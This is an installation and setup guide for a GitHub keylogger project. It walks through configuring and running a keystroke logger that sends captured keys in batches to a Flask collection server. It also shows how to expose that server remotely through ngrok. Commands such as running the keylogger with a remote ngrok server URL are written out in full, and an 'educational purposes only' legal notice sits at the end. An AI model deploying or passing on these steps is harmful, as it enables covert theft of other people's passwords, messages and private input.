# Installation and Setup Guide

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Running the Application](#running-the-application)
5. [Troubleshooting](#troubleshooting)

## Prerequisites

Before you begin, ensure you have the following installed:

- **Python 3.7 or higher**
  - Check: `python3 --version`
  - Download: https://www.python.org/downloads/

- **pip** (usually comes with Python)
  - Check: `pip3 --version`

- **git** (for cloning the repository)
  - Check: `git --version`
  - Download: https://git-scm.com/downloads

## Installation

### Step 1: Clone the Repository

```bash
git clone https://github.com/Stalin-143/Keylogger.git
cd Keylogger
```

### Step 2: Run Setup Script (Recommended)

```bash
chmod +x setup.sh
./setup.sh
```

The setup script will:
- Check for Python installation
- Create a virtual environment (optional)
- Install dependencies
- Set up configuration files

### Step 3: Manual Installation (Alternative)

If you prefer manual installation:

```bash
# Create virtual environment (recommended)
python3 -m venv venv

# Activate virtual environment
# On Linux/Mac:
source venv/bin/activate
# On Windows:
venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Copy configuration templates
cp config/config.json.example config/config.json
cp config/.env.example config/.env

# Create logs directory
mkdir -p logs
```

## Configuration

### 1. Edit config/config.json

```json
{
    "keylogger": {
        "log_file_path": "logs/keylog.txt",
        "batch_size": 10,
        "server_url": "https://your-ngrok-url.ngrok-free.app"
    },
    "web_server": {
        "log_file_path": "logs/keylog.txt",
        "host": "0.0.0.0",
        "port": 5000,
        "debug": false
    }
}
```

**Configuration Options:**

- `keylogger.log_file_path`: Path where keystrokes will be logged
- `keylogger.batch_size`: Number of keystrokes before sending to server
- `keylogger.server_url`: URL of the web server (use ngrok URL if remote)
- `web_server.log_file_path`: Path to read logs from
- `web_server.host`: Host to bind server to (0.0.0.0 for all interfaces)
- `web_server.port`: Port to bind server to
- `web_server.debug`: Enable Flask debug mode (set to false in production)

### 2. Edit config/.env

```bash
# Web Server Authentication
WEB_SERVER_USERNAME=admin
WEB_SERVER_PASSWORD=your_secure_password_here

# Flask Configuration
FLASK_DEBUG=False
```

**Important:** Change the default password to a secure one!

### 3. Set Environment Variables (Before Running)

```bash
# On Linux/Mac:
export $(cat config/.env | xargs)

# Or source it:
source config/.env

# On Windows (PowerShell):
Get-Content config/.env | ForEach-Object {
    $name, $value = $_.split('=')
    Set-Content env:\$name $value
}
```

## Running the Application

### Running the Web Server

**Basic usage:**
```bash
python3 src/server.py
```

**With custom configuration:**
```bash
python3 src/server.py --config config/config.json
```

**With command-line options:**
```bash
python3 src/server.py --port 8080 --debug
```

**All options:**
- `--config PATH`: Path to config file (default: config/config.json)
- `--log-file PATH`: Override log file path
- `--host HOST`: Host to bind to (default: 0.0.0.0)
- `--port PORT`: Port to bind to (default: 5000)
- `--debug`: Enable debug mode

### Exposing Server with ngrok (Optional)

If you want to access the server remotely:

1. **Download ngrok:**
   - Visit: https://ngrok.com/download
   - Or use package manager:
     ```bash
     # Linux (snap)
     snap install ngrok
     
     # Mac (homebrew)
     brew install ngrok/ngrok/ngrok
     ```

2. **Run ngrok:**
   ```bash
   ngrok http 5000
   ```

3. **Copy the URL:**
   ```
   Forwarding  https://xxxx-xxxx-xxxx.ngrok-free.app -> http://localhost:5000
   ```

4. **Update config.json:**
   - Replace `server_url` with the ngrok URL

### Running the Keylogger

**Basic usage:**
```bash
python3 src/keylogger.py
```

**With custom configuration:**
```bash
python3 src/keylogger.py --config config/config.json
```

**With command-line options:**
```bash
python3 src/keylogger.py --server-url https://your-url.ngrok-free.app --batch-size 20
```

**All options:**
- `--config PATH`: Path to config file (default: config/config.json)
- `--log-file PATH`: Override log file path
- `--server-url URL`: Override server URL
- `--batch-size N`: Override batch size

**Stopping the keylogger:**
- Press **ESC** key to stop

### Accessing the Web Interface

1. **Open browser:**
   - Local: http://localhost:5000
   - Remote: https://your-ngrok-url.ngrok-free.app

2. **Login:**
   - Username: (from config/.env)
   - Password: (from config/.env)

3. **View/Download logs:**
   - View logs in the browser
   - Click "Download Log File" to download

## Troubleshooting

### Common Issues

#### 1. "Config file not found"
```
Error: Config file not found at config/config.json
```

**Solution:**
```bash
cp config/config.json.example config/config.json
# Then edit config/config.json with your settings
```

#### 2. "Permission denied" when creating log directory
```
PermissionError: [Errno 13] Permission denied
```

**Solution:**
- Use a different log path with write permissions
- Or run with appropriate permissions
- Or use logs/ directory in the project folder

#### 3. "Module not found" errors
```
ModuleNotFoundError: No module named 'flask'
```

**Solution:**
```bash
pip install -r requirements.txt
```

#### 4. "Connection refused" when keylogger tries to send logs
```
Error sending log: Connection refused
```

**Solution:**
- Ensure the web server is running
- Check that the server URL in config.json is correct
- If using ngrok, ensure it's running and URL is updated

#### 5. Authentication not working
```
Unauthorized Access
```

**Solution:**
- Check that environment variables are set:
  ```bash
  echo $WEB_SERVER_USERNAME
  echo $WEB_SERVER_PASSWORD
  ```
- Re-export environment variables:
  ```bash
  source config/.env
  ```

#### 6. Port already in use
```
OSError: [Errno 48] Address already in use
```

**Solution:**
- Use a different port:
  ```bash
  python3 src/server.py --port 8080
  ```
- Or kill the process using the port:
  ```bash
  lsof -ti:5000 | xargs kill -9
  ```

### Getting Help

If you encounter issues not covered here:

1. Check the [README.md](../README.md)
2. Review [SECURITY.md](../SECURITY.md) for security concerns
3. Open an issue on GitHub

## Best Practices

1. **Always use a virtual environment** to avoid dependency conflicts
2. **Never commit config/config.json or config/.env** (they're in .gitignore)
3. **Use strong passwords** for web authentication
4. **Keep your server URL private** if using sensitive logs
5. **Only use on systems you own or have explicit permission to monitor**

## Legal Notice

⚠️ **This tool is for educational purposes only.**

- Always obtain explicit written consent before monitoring any system
- Unauthorized use is illegal and punishable by law
- Comply with all local, state, and federal laws
- Use responsibly and ethically

## Next Steps

After setup:
1. Read the full [README.md](../README.md)
2. Review [DISCLAIMER.md](../DISCLAIMER.md)
3. Run `./docs/manual.sh` for educational information
4. Start with local testing before deploying remotely

---

For more information, visit: https://github.com/Stalin-143/Keylogger
